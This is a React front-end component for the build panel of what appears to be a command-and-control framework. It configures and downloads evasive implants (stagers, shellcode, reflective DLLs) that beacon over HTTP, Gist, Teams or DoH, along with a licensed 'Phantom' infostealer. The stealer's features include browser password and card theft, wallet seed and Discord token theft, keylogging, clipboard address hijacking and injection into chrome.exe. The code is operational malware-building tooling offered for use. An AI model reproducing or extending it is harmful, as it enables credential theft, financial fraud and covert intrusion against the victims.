import { useState, useCallback } from 'react'
import useAgentStore, { API_BASE as API } from '../store/useAgentStore'

// ─── agent builder data ──────────────────────────────────────────────────────

const OUTPUTS = [
  { id: 'standalone',     label: 'EXE',    sub: 'standalone agent',  file: 'agent.exe'   },
  { id: 'stager',         label: 'STAGER', sub: 'staged loader',     file: 'stager.exe'  },
  { id: 'shellcode',      label: 'BIN',    sub: 'raw shellcode',      file: 'agent.bin'   },
  { id: 'reflective_dll', label: 'DLL',    sub: 'reflective dll',    file: 'agent.dll'   },
]

const CHANNELS = [
  { id: 'http',   label: 'HTTP'  },
  { id: 'github', label: 'GIST'  },
  { id: 'teams',  label: 'TEAMS' },
  { id: 'doh',    label: 'DoH'   },
]

const HTTP_PROFILES = [
  { id: 'default', label: 'Default' },
  { id: 'browser', label: 'Browser' },
  { id: 'office',  label: 'Office'  },
  { id: 'custom',  label: 'Custom'  },
]

const PROFILE_PRESETS = {
  default: { http_useragent: '', http_extra_headers: '' },
  browser: {
    http_useragent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
    http_extra_headers: 'Referer: https://www.google.com\nAccept-Language: en-US,en;q=0.9',
  },
  office: {
    http_useragent: 'Microsoft Office/16.0 (Windows NT 10.0; Microsoft Word 16.0.17531; Pro)',
    http_extra_headers: 'X-Session-ID: 00000000-0000-0000-0000-000000000000\nX-Application: Word',
  },
  custom: { http_useragent: '', http_extra_headers: '' },
}

const EVASION = [
  'Sleep obfuscation', 'Stack spoofing', 'ETW bypass', 'AMSI bypass',
  'Indirect syscalls', 'ntdll unhooking', 'XOR config', 'PPID spoofing',
  'No console window', 'Process hollowing',
]

const DEFAULT_AGENT_CFG = {
  output: 'standalone', channel: 'http',
  beacon_url: 'http://127.0.0.1:8000/beacon',
  stage_server_url: 'http://127.0.0.1:8000',
  beacon_interval: 30000, jitter_pct: 40, kill_date: '',
  github_token: '', gist_cmd: '', gist_out: '',
  teams_tenant: '', teams_client: '', teams_secret: '',
  teams_webhook: '', teams_team_id: '', teams_channel: '',
  doh_domain: 'c2.khaotic.fr',
  http_profile: 'default', http_useragent: '', http_extra_headers: '', http_cert_pin: '',
}

// ─── phantom builder data ─────────────────────────────────────────────────────

const PHANTOM_FEATURES = [
  { id: 'browser',    label: 'BROWSER',    desc: 'passwords · cookies · CC'  },
  { id: 'crypto',     label: 'CRYPTO',     desc: 'wallet seeds · keys'        },
  { id: 'keylogger',  label: 'KEYLOGGER',  desc: 'raw keystroke capture'      },
  { id: 'screenshot', label: 'SCREENSHOT', desc: 'on browser-open trigger'    },
  { id: 'clipboard',  label: 'CLIPBOARD',  desc: 'clipboard snapshot'         },
  { id: 'clipjack',   label: 'CLIPJACK',   desc: 'crypto addr substitution'   },
  { id: 'discord',    label: 'DISCORD',    desc: 'token stealer'              },
  { id: 'shell',      label: 'SHELL',      desc: 'remote cmd execution'       },
]

const DEFAULT_PHANTOM_CFG = {
  license_key: '',
  c2_host: '127.0.0.1',
  c2_port: 8443,
  poll_ms: 30000,
  jitter_pct: 20,
  format: 'pe',
  features: {
    browser: true, crypto: true, keylogger: true,
    screenshot: true, clipboard: true, clipjack: true,
    discord: true, shell: false,
  },
}

// ─── helpers ──────────────────────────────────────────────────────────────────

function ts()      { return new Date().toTimeString().slice(0, 8) }
function fmtMs(ms) {
  if (ms < 1000)  return ms + ' ms'
  if (ms < 60000) return (ms / 1000) + 's'
  return (ms / 60000).toFixed(1) + 'm'
}

async function sha256hex(blob) {
  const buf    = await blob.arrayBuffer()
  const digest = await crypto.subtle.digest('SHA-256', buf)
  return Array.from(new Uint8Array(digest)).map(b => b.toString(16).padStart(2, '0')).join('')
}

const PRESETS_KEY = 'khaos_build_presets'

// ─── root component ───────────────────────────────────────────────────────────

export default function Build() {
  const { token } = useAgentStore()
  const [mode, setMode]   = useState('agent')   // 'agent' | 'phantom'
  const [status, setStatus] = useState('idle')
  const [logs, setLogs]     = useState([])

  const log = (msg, type = 'info') => setLogs(l => [...l, { ts: ts(), msg, type }])
  const resetState = () => { setStatus('idle'); setLogs([]) }

  return (
    <div style={S.root}>
      {/* ══ LEFT PANEL ══ */}
      <div style={S.panel}>
        {/* Mode switch */}
        <div style={{ display: 'flex', gap: 0, borderBottom: '1px solid #1a1a1a', marginBottom: 4 }}>
          <ModeTab active={mode === 'agent'}   onClick={() => { setMode('agent');   resetState() }}>AGENT</ModeTab>
          <ModeTab active={mode === 'phantom'} onClick={() => { setMode('phantom'); resetState() }}>PHANTOM</ModeTab>
        </div>

        {mode === 'agent'
          ? <AgentPanel token={token} status={status} setStatus={setStatus} log={log} setLogs={setLogs} />
          : <PhantomPanel token={token} status={status} setStatus={setStatus} log={log} setLogs={setLogs} />
        }
      </div>

      {/* ══ RIGHT PANEL ══ */}
      <div style={S.right}>
        <BuildOutput mode={mode} status={status} logs={logs} setLogs={setLogs} />
      </div>
    </div>
  )
}

// ─── AGENT panel ─────────────────────────────────────────────────────────────

function AgentPanel({ token, status, setStatus, log, setLogs }) {
  const [cfg, setCfg]     = useState(DEFAULT_AGENT_CFG)
  const [errs, setErrs]   = useState({})
  const [copied, setCopied] = useState(false)
  const [presets, setPresets] = useState(() => {
    try { return JSON.parse(localStorage.getItem(PRESETS_KEY) || '{}') } catch { return {} }
  })

  const set = useCallback((k, v) => {
    setCfg(p => ({ ...p, [k]: v }))
    setErrs(e => { const n = { ...e }; delete n[k]; return n })
  }, [])

  const applyProfile = (id) => {
    setCfg(p => ({ ...p, http_profile: id, ...(PROFILE_PRESETS[id] || PROFILE_PRESETS.default) }))
  }

  const savePreset = () => {
    const name = prompt('Preset name:')
    if (!name?.trim()) return
    const next = { ...presets, [name.trim()]: cfg }
    setPresets(next)
    localStorage.setItem(PRESETS_KEY, JSON.stringify(next))
  }
  const loadPreset   = n => { setCfg(presets[n]); setErrs({}) }
  const deletePreset = n => {
    const next = { ...presets }; delete next[n]
    setPresets(next)
    localStorage.setItem(PRESETS_KEY, JSON.stringify(next))
  }

  const validate = () => {
    const e = {}
    if (cfg.channel === 'http'   && !cfg.beacon_url.trim())       e.beacon_url       = 1
    if (cfg.output  === 'stager' && !cfg.stage_server_url.trim()) e.stage_server_url = 1
    if (cfg.channel === 'github') {
      if (!cfg.github_token.trim()) e.github_token = 1
      if (!cfg.gist_cmd.trim())     e.gist_cmd     = 1
      if (!cfg.gist_out.trim())     e.gist_out     = 1
    }
    if (cfg.channel === 'teams') {
      if (!cfg.teams_tenant.trim())  e.teams_tenant  = 1
      if (!cfg.teams_client.trim())  e.teams_client  = 1
      if (!cfg.teams_secret.trim())  e.teams_secret  = 1
      if (!cfg.teams_webhook.trim()) e.teams_webhook = 1
    }
    if (cfg.channel === 'doh' && !cfg.doh_domain.trim()) e.doh_domain = 1
    return e
  }

  const build = async () => {
    const v = validate()
    if (Object.keys(v).length) { setErrs(v); return }
    setStatus('building'); setLogs([])
    log(`${cfg.output}  ·  ${cfg.channel}  ·  ${fmtMs(cfg.beacon_interval)} ±${cfg.jitter_pct}%`, 'dim')
    try {
      const res = await fetch(`${API}/build`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', Authorization: 'Bearer ' + token },
        body: JSON.stringify(cfg),
      })
      if (!res.ok) {
        const err = await res.json().catch(() => ({ detail: res.statusText }))
        log(err.detail || 'build failed', 'error')
        setStatus('error'); return
      }
      const blob    = await res.blob()
      const outFile = OUTPUTS.find(o => o.id === cfg.output)?.file || 'agent.exe'
      const url     = URL.createObjectURL(blob)
      const a       = document.createElement('a'); a.href = url; a.download = outFile
      document.body.appendChild(a); a.click(); document.body.removeChild(a)
      URL.revokeObjectURL(url)
      log(`${outFile}  —  ${(blob.size / 1024).toFixed(1)} KB`, 'ok')
      sha256hex(blob).then(h => log(`sha256  ${h}`, 'dim'))
      setStatus('ok')
    } catch (e) {
      log(e.message, 'error')
      setStatus('error')
    }
  }

  const reset = () => { setCfg(DEFAULT_AGENT_CFG); setErrs({}); setStatus('idle'); setLogs([]) }
  const building = status === 'building'
  const outFile  = OUTPUTS.find(o => o.id === cfg.output)?.file || 'agent.exe'
  const presetNames = Object.keys(presets)

  return (
    <div style={{ padding: '18px 24px', display: 'flex', flexDirection: 'column', gap: 22 }}>
      {/* PRESETS */}
      <div style={{ display: 'flex', alignItems: 'center', gap: 6, flexWrap: 'wrap' }}>
        <span style={{ fontSize: 8, color: '#444', letterSpacing: 2, flexShrink: 0 }}>PRESETS</span>
        {presetNames.map(n => (
          <div key={n} style={{ display: 'flex' }}>
            <button onClick={() => loadPreset(n)} style={S.presetBtn}>{n}</button>
            <button onClick={() => deletePreset(n)} style={{ ...S.presetBtn, borderLeft: 'none', color: '#3a3a3a', padding: '3px 6px' }}>×</button>
          </div>
        ))}
        <button onClick={savePreset} style={{ ...S.presetBtn, color: '#444' }}>+ SAVE</button>
      </div>

      {/* FORMAT */}
      <Section title="Format">
        <div style={{ display: 'grid', gridTemplateColumns: 'repeat(4,1fr)', gap: 4 }}>
          {OUTPUTS.map(o => (
            <FormatCard key={o.id} active={cfg.output === o.id} onClick={() => set('output', o.id)}>
              <div style={{ fontSize: 11, fontWeight: 600, letterSpacing: 1 }}>{o.label}</div>
              <div style={{ fontSize: 8, opacity: 0.5, marginTop: 3, fontFamily: 'monospace' }}>{o.file}</div>
            </FormatCard>
          ))}
        </div>
        {cfg.output === 'stager' && (
          <Field label="Stage URL" error={errs.stage_server_url}>
            <FInput value={cfg.stage_server_url} onChange={v => set('stage_server_url', v)} placeholder="http://..." mono err={errs.stage_server_url} />
          </Field>
        )}
      </Section>

      {/* TRANSPORT */}
      <Section title="Transport">
        <div style={{ display: 'grid', gridTemplateColumns: 'repeat(4,1fr)', gap: 4 }}>
          {CHANNELS.map(c => (
            <ToggleBtn key={c.id} active={cfg.channel === c.id} accent="#ff3131"
              onClick={() => set('channel', c.id)}>{c.label}</ToggleBtn>
          ))}
        </div>

        {cfg.channel === 'http' && (
          <>
            <Field label="Beacon URL" error={errs.beacon_url}>
              <div style={{ display: 'flex', gap: 4 }}>
                <FInput value={cfg.beacon_url} onChange={v => set('beacon_url', v)} placeholder="http://host:port/path" mono err={errs.beacon_url} />
                <button onClick={() => { navigator.clipboard.writeText(cfg.beacon_url) }} style={{
                  flexShrink: 0, width: 32, background: '#0c0c0c',
                  border: '1px solid #1e1e1e', color: '#444', cursor: 'pointer', fontSize: 12,
                }}>⎘</button>
              </div>
            </Field>
            <Field label="HTTP Profile">
              <div style={{ display: 'grid', gridTemplateColumns: 'repeat(4,1fr)', gap: 4 }}>
                {HTTP_PROFILES.map(p => (
                  <ToggleBtn key={p.id} active={cfg.http_profile === p.id} accent="#3fb950"
                    onClick={() => applyProfile(p.id)}>{p.label}</ToggleBtn>
                ))}
              </div>
            </Field>
            {cfg.http_profile !== 'default' && (
              <>
                <Field label="User-Agent">
                  <FInput value={cfg.http_useragent} onChange={v => set('http_useragent', v)} placeholder="Leave empty for default" mono />
                </Field>
                <Field label="Extra Headers">
                  <textarea style={{ ...S.input, height: 56, resize: 'vertical', fontFamily: 'monospace', fontSize: 10 }}
                    value={cfg.http_extra_headers}
                    onChange={e => set('http_extra_headers', e.target.value)}
                    placeholder={'Header-Name: value\nHeader-Name: value'} />
                </Field>
              </>
            )}
            <Field label="Cert Pin (SHA-256)">
              <FInput value={cfg.http_cert_pin} onChange={v => set('http_cert_pin', v)} placeholder="Leave empty to disable pinning" mono />
            </Field>
          </>
        )}

        {cfg.channel === 'github' && (
          <>
            <Field label="GitHub Token" error={errs.github_token}>
              <FInput value={cfg.github_token} onChange={v => set('github_token', v)} placeholder="ghp_..." mono err={errs.github_token} />
            </Field>
            <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: 8 }}>
              <Field label="Gist CMD" error={errs.gist_cmd}>
                <FInput value={cfg.gist_cmd} onChange={v => set('gist_cmd', v)} placeholder="Gist ID" mono err={errs.gist_cmd} />
              </Field>
              <Field label="Gist OUT" error={errs.gist_out}>
                <FInput value={cfg.gist_out} onChange={v => set('gist_out', v)} placeholder="Gist ID" mono err={errs.gist_out} />
              </Field>
            </div>
          </>
        )}

        {cfg.channel === 'teams' && (
          <>
            <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: 8 }}>
              <Field label="Tenant ID" error={errs.teams_tenant}>
                <FInput value={cfg.teams_tenant} onChange={v => set('teams_tenant', v)} placeholder="UUID" mono err={errs.teams_tenant} />
              </Field>
              <Field label="Client ID" error={errs.teams_client}>
                <FInput value={cfg.teams_client} onChange={v => set('teams_client', v)} placeholder="UUID" mono err={errs.teams_client} />
              </Field>
            </div>
            <Field label="Client Secret" error={errs.teams_secret}>
              <FInput value={cfg.teams_secret} onChange={v => set('teams_secret', v)} placeholder="••••••••" mono type="password" err={errs.teams_secret} />
            </Field>
            <Field label="Webhook URL" error={errs.teams_webhook}>
              <FInput value={cfg.teams_webhook} onChange={v => set('teams_webhook', v)} placeholder="https://..." mono err={errs.teams_webhook} />
            </Field>
            <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: 8 }}>
              <Field label="Team ID">
                <FInput value={cfg.teams_team_id} onChange={v => set('teams_team_id', v)} placeholder="ID" mono />
              </Field>
              <Field label="Channel ID">
                <FInput value={cfg.teams_channel} onChange={v => set('teams_channel', v)} placeholder="ID" mono />
              </Field>
            </div>
          </>
        )}

        {cfg.channel === 'doh' && (
          <Field label="DoH Domain" error={errs.doh_domain}>
            <FInput value={cfg.doh_domain} onChange={v => set('doh_domain', v)} placeholder="c2.example.com" mono err={errs.doh_domain} />
          </Field>
        )}
      </Section>

      {/* BEHAVIOUR */}
      <Section title="Behaviour">
        <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: 16 }}>
          <Knob label="Interval" value={cfg.beacon_interval} display={fmtMs(cfg.beacon_interval)}
            min={1000} max={300000} step={1000} onChange={v => set('beacon_interval', v)} />
          <Knob label="Jitter" value={cfg.jitter_pct} display={cfg.jitter_pct + '%'}
            min={0} max={80} step={5} onChange={v => set('jitter_pct', v)} />
        </div>
        <Field label="Kill Date">
          <input type="date" style={S.input} value={cfg.kill_date} onChange={e => set('kill_date', e.target.value)} />
        </Field>
      </Section>

      {/* BUILD BUTTON */}
      <div style={{ display: 'flex', gap: 8 }}>
        <button onClick={reset} style={{ ...S.actionBtn, color: '#3a3a3a', borderColor: '#1e1e1e' }}>RESET</button>
        <button onClick={build} disabled={building} style={{
          ...S.actionBtn, flex: 1,
          background: building ? 'transparent' : '#ff31310f',
          border: `1px solid ${building ? '#2a2a2a' : '#ff3131'}`,
          color: building ? '#333' : '#ff3131',
          cursor: building ? 'default' : 'pointer',
        }}>
          {building ? 'Building…' : `BUILD  ${outFile}`}
        </button>
      </div>
    </div>
  )
}

// ─── PHANTOM panel ────────────────────────────────────────────────────────────

function PhantomPanel({ token, status, setStatus, log, setLogs }) {
  const [cfg, setCfg]   = useState(DEFAULT_PHANTOM_CFG)
  const [errs, setErrs] = useState({})

  const set = useCallback((k, v) => {
    setCfg(p => ({ ...p, [k]: v }))
    setErrs(e => { const n = { ...e }; delete n[k]; return n })
  }, [])

  const toggleFeat = (id) => {
    setCfg(p => ({ ...p, features: { ...p.features, [id]: !p.features[id] } }))
  }

  const setAllFeatures = (val) => {
    const all = {}
    PHANTOM_FEATURES.forEach(f => { all[f.id] = val })
    setCfg(p => ({ ...p, features: all }))
  }

  const validate = () => {
    const e = {}
    if (!cfg.license_key.trim()) e.license_key = 1
    if (!cfg.c2_host.trim())     e.c2_host     = 1
    return e
  }

  const build = async () => {
    const v = validate()
    if (Object.keys(v).length) { setErrs(v); return }
    setStatus('building'); setLogs([])

    const featureList = PHANTOM_FEATURES.filter(f => cfg.features[f.id]).map(f => f.label).join(' · ')
    log(`phantom  ·  ${cfg.c2_host}:${cfg.c2_port}  ·  ${fmtMs(cfg.poll_ms)} ±${cfg.jitter_pct}%  ·  ${cfg.format.toUpperCase()}`, 'dim')
    log(`features: ${featureList || 'none'}`, 'dim')

    try {
      const body = {
        license_key: cfg.license_key,
        c2_host:     cfg.c2_host,
        c2_port:     Number(cfg.c2_port),
        poll_ms:     cfg.poll_ms,
        jitter_pct:  cfg.jitter_pct,
        format:      cfg.format,
        features:    cfg.features,
      }
      const res = await fetch(`${API}/phantom`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', Authorization: 'Bearer ' + token },
        body: JSON.stringify(body),
      })
      if (!res.ok) {
        const err = await res.json().catch(() => ({ detail: res.statusText }))
        log(err.detail || 'build failed', 'error')
        setStatus('error'); return
      }
      const buildUuid = res.headers.get('X-Build-UUID') || '?'
      const blob      = await res.blob()
      const outFile   = cfg.format === 'bin' ? 'phantom.bin' : 'phantom.exe'
      const url       = URL.createObjectURL(blob)
      const a         = document.createElement('a'); a.href = url; a.download = outFile
      document.body.appendChild(a); a.click(); document.body.removeChild(a)
      URL.revokeObjectURL(url)
      log(`${outFile}  —  ${(blob.size / 1024).toFixed(1)} KB`, 'ok')
      log(`uuid  ${buildUuid}`, 'dim')
      sha256hex(blob).then(h => log(`sha256  ${h}`, 'dim'))
      setStatus('ok')
    } catch (e) {
      log(e.message, 'error')
      setStatus('error')
    }
  }

  const reset = () => { setCfg(DEFAULT_PHANTOM_CFG); setErrs({}); setStatus('idle'); setLogs([]) }
  const building = status === 'building'
  const activeCount = PHANTOM_FEATURES.filter(f => cfg.features[f.id]).length

  return (
    <div style={{ padding: '18px 24px', display: 'flex', flexDirection: 'column', gap: 22 }}>

      {/* IDENTITY */}
      <Section title="Identity">
        <Field label="License Key" error={errs.license_key}>
          <FInput value={cfg.license_key} onChange={v => set('license_key', v)}
            placeholder="XXXX-XXXX-XXXX-XXXX" mono err={errs.license_key} />
        </Field>
      </Section>

      {/* C2 */}
      <Section title="C2 Target">
        <div style={{ display: 'grid', gridTemplateColumns: '1fr 90px', gap: 8 }}>
          <Field label="Host" error={errs.c2_host}>
            <FInput value={cfg.c2_host} onChange={v => set('c2_host', v)}
              placeholder="127.0.0.1" mono err={errs.c2_host} />
          </Field>
          <Field label="Port">
            <input type="number" min={1} max={65535}
              value={cfg.c2_port}
              onChange={e => set('c2_port', Number(e.target.value))}
              style={{ ...S.input, fontFamily: 'monospace' }} />
          </Field>
        </div>
        <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: 16 }}>
          <Knob label="Interval" value={cfg.poll_ms} display={fmtMs(cfg.poll_ms)}
            min={5000} max={300000} step={5000} onChange={v => set('poll_ms', v)} />
          <Knob label="Jitter" value={cfg.jitter_pct} display={cfg.jitter_pct + '%'}
            min={0} max={60} step={5} onChange={v => set('jitter_pct', v)} />
        </div>
      </Section>

      {/* FEATURES */}
      <Section title={`Features  (${activeCount}/${PHANTOM_FEATURES.length})`}>
        <div style={{ display: 'flex', gap: 8, marginBottom: 4 }}>
          <button onClick={() => setAllFeatures(true)}  style={{ ...S.presetBtn, color: '#3fb950' }}>ALL ON</button>
          <button onClick={() => setAllFeatures(false)} style={{ ...S.presetBtn, color: '#f85149' }}>ALL OFF</button>
        </div>
        <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: 6 }}>
          {PHANTOM_FEATURES.map(f => {
            const on = cfg.features[f.id]
            return (
              <button key={f.id} onClick={() => toggleFeat(f.id)} style={{
                display: 'flex', flexDirection: 'column', alignItems: 'flex-start',
                padding: '10px 12px', gap: 4,
                background: on ? '#0a180a' : '#0c0c0c',
                border: `1px solid ${on ? '#3fb95044' : '#1a1a1a'}`,
                cursor: 'pointer', textAlign: 'left', transition: 'all .12s',
              }}>
                <div style={{ display: 'flex', alignItems: 'center', gap: 7 }}>
                  <div style={{
                    width: 6, height: 6, borderRadius: '50%',
                    background: on ? '#3fb950' : '#2a2a2a',
                    boxShadow: on ? '0 0 5px #3fb950' : 'none',
                    transition: 'all .12s', flexShrink: 0,
                  }} />
                  <span style={{ fontSize: 10, letterSpacing: 1.5, color: on ? '#3fb950' : '#444', fontFamily: 'inherit' }}>{f.label}</span>
                </div>
                <span style={{ fontSize: 9, color: '#333', paddingLeft: 13, fontFamily: 'monospace' }}>{f.desc}</span>
              </button>
            )
          })}
        </div>
      </Section>

      {/* FORMAT */}
      <Section title="Output Format">
        <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: 4 }}>
          {[
            { id: 'pe',  label: 'EXE',  desc: 'native PE'     },
            { id: 'bin', label: 'BIN',  desc: 'donut shellcode' },
          ].map(o => (
            <FormatCard key={o.id} active={cfg.format === o.id} onClick={() => set('format', o.id)}>
              <div style={{ fontSize: 11, fontWeight: 600, letterSpacing: 1 }}>{o.label}</div>
              <div style={{ fontSize: 8, opacity: 0.5, marginTop: 3, fontFamily: 'monospace' }}>{o.desc}</div>
            </FormatCard>
          ))}
        </div>
      </Section>

      {/* BUILD BUTTON */}
      <div style={{ display: 'flex', gap: 8 }}>
        <button onClick={reset} style={{ ...S.actionBtn, color: '#3a3a3a', borderColor: '#1e1e1e' }}>RESET</button>
        <button onClick={build} disabled={building} style={{
          ...S.actionBtn, flex: 1,
          background: building ? 'transparent' : '#3fb9500f',
          border: `1px solid ${building ? '#2a2a2a' : '#3fb950'}`,
          color: building ? '#333' : '#3fb950',
          cursor: building ? 'default' : 'pointer',
        }}>
          {building ? 'Building…' : `BUILD  phantom.${cfg.format}`}
        </button>
      </div>

    </div>
  )
}

// ─── right panel — shared output console ─────────────────────────────────────

function BuildOutput({ mode, status, logs, setLogs }) {
  const accent = mode === 'phantom' ? '#3fb950' : '#ff3131'

  return (
    <>
      {/* Header */}
      <div style={S.header}>
        <div style={{ display: 'flex', alignItems: 'center', gap: 10 }}>
          <StatusDot status={status} accent={accent} />
          <span style={{ fontSize: 11, color: '#bbbfc8' }}>
            {status === 'idle'     && <span style={{ color: '#484848' }}>Ready to compile</span>}
            {status === 'building' && <span style={{ color: '#f59e0b' }}>Compiling…</span>}
            {status === 'ok'       && <span style={{ color: accent }}>Build successful</span>}
            {status === 'error'    && <span style={{ color: '#f85149' }}>Build failed</span>}
          </span>
        </div>
        {logs.length > 0 && (
          <button onClick={() => setLogs([])} style={{ ...S.actionBtn, color: '#3a3a3a', borderColor: '#1a1a1a' }}>CLEAR</button>
        )}
      </div>

      {/* Console */}
      <div style={S.console}>
        {logs.length === 0 ? (
          <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', height: '100%', gap: 8 }}>
            <div style={{ fontSize: 28, color: '#181818' }}>{mode === 'phantom' ? '◉' : '⬡'}</div>
            <div style={{ fontSize: 9, color: '#2a2a2a', letterSpacing: 3 }}>AWAITING BUILD</div>
          </div>
        ) : (
          <div style={{ padding: '14px 18px' }}>
            {logs.map((l, i) => {
              const col = l.type === 'ok' ? accent : l.type === 'error' ? '#f85149' : l.type === 'dim' ? '#484848' : '#7a8a9a'
              return (
                <div key={i} style={{ display: 'flex', gap: 16, fontFamily: 'monospace', fontSize: 10, lineHeight: '1.9' }}>
                  <span style={{ color: '#2e2e2e', flexShrink: 0, userSelect: 'none' }}>{l.ts}</span>
                  <span style={{ color: col }}>{l.msg}</span>
                </div>
              )
            })}
          </div>
        )}
      </div>

      {/* Footer */}
      {mode === 'agent' && (
        <div style={S.evasion}>
          <span style={{ fontSize: 9, color: '#484848', letterSpacing: 2.5, display: 'block', marginBottom: 14 }}>EVASION STACK</span>
          <div style={{ display: 'grid', gridTemplateColumns: 'repeat(2,1fr)', gap: '8px 24px' }}>
            {EVASION.map(e => (
              <div key={e} style={{ display: 'flex', alignItems: 'center', gap: 8 }}>
                <div style={{ width: 3, height: 3, borderRadius: '50%', background: '#3fb950', flexShrink: 0 }} />
                <span style={{ fontSize: 12, color: '#666', fontFamily: 'monospace' }}>{e}</span>
              </div>
            ))}
          </div>
        </div>
      )}
      {mode === 'phantom' && (
        <div style={S.evasion}>
          <span style={{ fontSize: 9, color: '#484848', letterSpacing: 2.5, display: 'block', marginBottom: 10 }}>BUILD INFO</span>
          <div style={{ display: 'flex', flexDirection: 'column', gap: 6 }}>
            {[
              'Per-build UUID watermark compiled in',
              'phantom_config.h generated server-side',
              'mTLS via embedded client cert',
              'BCryptProtectMemory heap scanner',
              'Chrome v20 app-bound key extraction',
              'Reflective injection into chrome.exe',
              'Browser-open window trigger (8s warmup)',
            ].map(t => (
              <div key={t} style={{ display: 'flex', alignItems: 'center', gap: 8 }}>
                <div style={{ width: 3, height: 3, borderRadius: '50%', background: '#3fb950', flexShrink: 0 }} />
                <span style={{ fontSize: 11, color: '#555', fontFamily: 'monospace' }}>{t}</span>
              </div>
            ))}
          </div>
        </div>
      )}
    </>
  )
}

// ─── sub-components ───────────────────────────────────────────────────────────

function ModeTab({ active, onClick, children }) {
  return (
    <button onClick={onClick} style={{
      flex: 1, padding: '10px 0', background: 'transparent',
      border: 'none', borderBottom: `2px solid ${active ? '#ff3131' : 'transparent'}`,
      color: active ? '#ff3131' : '#444',
      fontFamily: 'inherit', fontSize: 10, letterSpacing: 2.5,
      cursor: 'pointer', textTransform: 'uppercase', transition: 'all .12s',
    }}>{children}</button>
  )
}

function Section({ title, children }) {
  return (
    <div style={{ display: 'flex', flexDirection: 'column', gap: 12 }}>
      <div style={{ display: 'flex', alignItems: 'center', gap: 10 }}>
        <span style={{ fontSize: 9, color: '#555', letterSpacing: 2.5, textTransform: 'uppercase', flexShrink: 0 }}>{title}</span>
        <div style={{ flex: 1, height: 1, background: '#1c1c1c' }} />
      </div>
      {children}
    </div>
  )
}

function Field({ label, children, error }) {
  return (
    <div style={{ display: 'flex', flexDirection: 'column', gap: 5 }}>
      <span style={{ fontSize: 9, color: error ? '#f85149' : '#484848', letterSpacing: 1.5, textTransform: 'uppercase' }}>{label}</span>
      {children}
    </div>
  )
}

function FormatCard({ active, onClick, children }) {
  return (
    <button onClick={onClick} style={{
      padding: '14px 6px', textAlign: 'center',
      background: active ? '#0d1a0d' : '#0c0c0c',
      border: `1px solid ${active ? '#3fb950' : '#1e1e1e'}`,
      color: active ? '#3fb950' : '#555',
      fontFamily: 'inherit', cursor: 'pointer', transition: 'all .15s',
    }}>{children}</button>
  )
}

function ToggleBtn({ active, accent, onClick, children }) {
  return (
    <button onClick={onClick} style={{
      padding: '10px 4px', textAlign: 'center',
      background: active ? accent + '12' : '#0c0c0c',
      border: `1px solid ${active ? accent : '#1e1e1e'}`,
      color: active ? accent : '#555',
      fontFamily: 'inherit', fontSize: 10, letterSpacing: 1.5,
      cursor: 'pointer', textTransform: 'uppercase', transition: 'all .15s',
    }}>{children}</button>
  )
}

function FInput({ value, onChange, placeholder, mono, err, type = 'text' }) {
  return (
    <input type={type} value={value} onChange={e => onChange(e.target.value)} placeholder={placeholder}
      style={{ ...S.input, borderColor: err ? '#f85149' : '#1e1e1e', fontFamily: mono ? 'monospace' : 'inherit' }} />
  )
}

function Knob({ label, value, display, min, max, step, onChange }) {
  return (
    <div style={{ display: 'flex', flexDirection: 'column', gap: 8 }}>
      <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'baseline' }}>
        <span style={{ fontSize: 9, color: '#484848', letterSpacing: 1.5, textTransform: 'uppercase' }}>{label}</span>
        <span style={{ fontSize: 15, color: '#bbbfc8', fontFamily: 'monospace', fontWeight: 300 }}>{display}</span>
      </div>
      <input type="range" min={min} max={max} step={step} value={value}
        onChange={e => onChange(Number(e.target.value))}
        style={{ width: '100%', accentColor: '#ff3131', cursor: 'pointer', margin: 0, height: 2 }} />
    </div>
  )
}

function StatusDot({ status, accent = '#ff3131' }) {
  const col = { idle: '#2a2a2a', building: '#f59e0b', ok: accent, error: '#f85149' }[status]
  return (
    <div style={{ width: 7, height: 7, borderRadius: '50%', background: col,
      boxShadow: status !== 'idle' ? `0 0 6px ${col}` : 'none', flexShrink: 0 }} />
  )
}

// ─── styles ───────────────────────────────────────────────────────────────────

const S = {
  root:    { flex: 1, display: 'flex', minHeight: 0, overflow: 'hidden' },
  panel: {
    width: 420, flexShrink: 0,
    display: 'flex', flexDirection: 'column', gap: 0,
    overflowY: 'auto', borderRight: '1px solid #141414',
    background: '#080808',
  },
  right:   { flex: 1, display: 'flex', flexDirection: 'column', minWidth: 0, background: '#070707' },
  header: {
    display: 'flex', alignItems: 'center', justifyContent: 'space-between',
    padding: '12px 20px', borderBottom: '1px solid #141414', flexShrink: 0,
  },
  console: { flex: 1, overflow: 'auto', minHeight: 0 },
  evasion: {
    padding: '22px 24px', borderTop: '1px solid #141414',
    flexShrink: 0, background: '#060606',
  },
  input: {
    width: '100%', boxSizing: 'border-box',
    background: '#0c0c0c', border: '1px solid #1e1e1e',
    color: '#bbbfc8', padding: '7px 10px',
    fontFamily: 'inherit', fontSize: 11, outline: 'none',
  },
  presetBtn: {
    padding: '3px 9px', background: '#0e0e0e', border: '1px solid #222',
    color: '#888', fontFamily: 'inherit', fontSize: 9, cursor: 'pointer', letterSpacing: 1,
  },
  actionBtn: {
    padding: '8px 16px', background: 'transparent',
    border: '1px solid #2a2a2a', color: '#888',
    fontFamily: 'inherit', fontSize: 10, letterSpacing: 2,
    cursor: 'pointer', textTransform: 'uppercase',
  },
}
